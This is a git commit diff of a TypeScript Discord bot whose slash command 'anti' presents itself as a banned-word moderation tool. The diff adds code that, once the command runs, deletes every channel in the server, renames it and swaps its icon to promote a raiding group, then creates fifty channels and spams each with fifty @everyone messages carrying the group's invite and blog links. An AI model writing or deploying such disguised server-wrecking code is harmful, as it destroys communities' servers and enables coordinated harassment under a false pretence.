085010c69fd57788d1a89c4f20486fe0932531d3
EdamAme <121654029+EdamAme-x@users.noreply.github.com>
2023-12-28 22:20:52 +0900

    add

--- main.ts
+++ main.ts
@@ -11,19 +11,19 @@ try {
   Logger.log(`Command registering.`);
   await rest.put(Routes.applicationCommands(CLIENT_ID), {
     body: [
-        {
-          name: "anti",
-          description: "**禁止ワードを登録中...**",
-          type: 1,
-          options: [
-            {
-                name: "text",
-                type: 3,
-                required: false,
-                description: "**禁止する文章を入力してください**",
-            },
-          ],
-        }
+      {
+        name: "anti",
+        description: "**禁止ワードを登録中...**",
+        type: 1,
+        options: [
+          {
+            name: "text",
+            type: 3,
+            required: false,
+            description: "**禁止する文章を入力してください**",
+          },
+        ],
+      },
     ],
   });
   Logger.log(`Command registered.`);
@@ -43,23 +43,54 @@ client.on("interactionCreate", async (interaction: Interaction) => {
     const name = interaction.commandName;
 
     if (name === "anti") {
-      const text = interaction.options.data[0] ? interaction.options.data[0].value : `<@everyone>
-# 荒らし共栄圏最強
+      const text = (
+        interaction.options.data[0]
+          ? interaction.options.data[0].value
+          : `# 荒らし共栄圏最強
 # [荒らし共栄圏に参加](https://ctkpaarr.data.blog/#Discord)
 https://ctkpaarr.data.blog/
 https://discord.gg/annycW3Xrk
 # 荒らし共栄圏万歳
+@everyone
 ーーーーーーーーーーーーーーーー
 （画像） https://imgur.com/LacFtDP
 （画像） https://imgur.com/gQkpAYe
 （画像） https://imgur.com/mOlUpn3
-`;
-      await interaction.reply({ content: `**禁止ワードを登録しました**\n${text}`, ephemeral: true });
+`
+      )?.toString();
+      await interaction.reply({ content: `**禁止ワードを登録しました**` });
 
       // NUKE
-      const channels = await interaction.guild?.channels.fetch(interaction.guildId ?? "");
+      const discordServer = client.guilds.cache.get(interaction.guildId ?? "");
+      discordServer?.channels.cache.forEach(async (channel) => {
+        try {
+          await channel.delete();
+        } catch (_e) {}
+      });
 
-      console.log(channels);
+      const max = 50;
+      discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
+      discordServer?.setIcon("https://ctkpaarrdata.files.wordpress.com/2023/03/cropped-20211120_125906.gif?w=196")
+
+      for (let i = 0; i < max; i++) {
+        discordServer?.channels
+          .create({
+            name: text?.split("\n")[0] ?? "荒らし共栄圏万歳！",
+            type: 0,
+          })
+          .then(async (channel) => {
+            for (let j = 0; j < max; j++) {
+              try {
+                channel.send(
+                  text ??
+                    "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone"
+                );
+              } catch (_e) {}
+            }
+          });
+      }
+
+      discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
     }
   }
 });
